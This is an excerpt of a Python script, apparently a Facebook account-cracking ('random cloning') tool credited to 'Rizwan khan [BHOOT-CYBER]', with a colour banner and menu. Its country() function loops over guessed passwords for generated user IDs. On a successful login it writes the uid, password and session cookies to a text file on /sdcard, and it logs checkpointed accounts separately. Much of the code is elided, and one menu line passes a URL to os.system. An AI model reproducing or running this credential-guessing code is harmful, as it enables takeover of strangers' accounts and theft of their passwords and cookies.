#-----------------------[ INFO-CODE ]-----------------------#
"""Open By   : Rizwan khan [BHOOT-CYBER]
RIZZUeloper : Rizwan khan
Github    : Rizzu-Cyber-786
Status    : Open Source"""
#-----------------------[ IMPORT-CODE ]-----------------------#
import os
import sys
...
[+]==============================================
[+]\033[1;32m CREATED BY   : \033[1;32m RIZZU KHAN
[+]\033[1;32m FB GROUP     :  \033[1;32m GRUP NAHI BNATA
[+]\033[1;32m BROTHER      :   \033[1;32mSRK 
[+]\033[1;32m TOOL STATUS  : \033[1;32m RANDOM
[+]\033[1;32m TOOL VIRSION :\033[1;32m   8.0
[+]\033[1;32m BESTFRIENDS  :\033[1;32m  NOTHING
[+]=============================================="""
#-----------------------[ CLEAR-CODE ]-----------------------#
...
def Main():
    ...
    elif manu in ['2','02']:os.system('https://www.facebook.com/www.facebook.10003458746538?mibextid=ZbWKwL');Main()
    else:Main()
#-----------------------[ COUNTRY-CODE ]-----------------------#
def country():
        ...
        try:
                for pas in pasx:
                        ...
                        if 'session_key' in po:
                                ...
                                open('/sdcard/RIZZU OK-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                ok.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                if 'y' in cpx:print(f'\r{r} (RIZZU) {str(uid)} | {pas} ')
                                open('/sdcard/RIZZU OK-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
